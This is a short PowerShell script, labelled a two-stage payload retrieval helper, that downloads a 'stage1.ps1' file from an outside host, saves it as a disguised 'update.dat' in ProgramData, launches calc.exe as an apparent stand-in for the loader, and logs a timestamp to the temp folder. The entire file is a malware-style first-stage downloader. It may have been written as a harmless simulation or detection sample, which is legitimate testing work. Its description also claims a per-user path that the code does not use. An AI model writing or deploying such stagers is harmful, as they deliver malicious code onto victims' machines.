
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://adatum.com/stage1.ps1",
    [string]$OutputPath = "C:\ProgramData\update.dat",
    [int]$TimeoutSec = 22
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$OperationResult = Invoke-StageDownload -SourceUrl $FetchUrl -DestinationPath $OutputPath -TimeoutSec $TimeoutSec
if ($OperationResult) {
    Start-Process -FilePath "calc.exe"
}
$ProgressPreference = "SilentlyContinue"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$StageMarker = "stage-28"
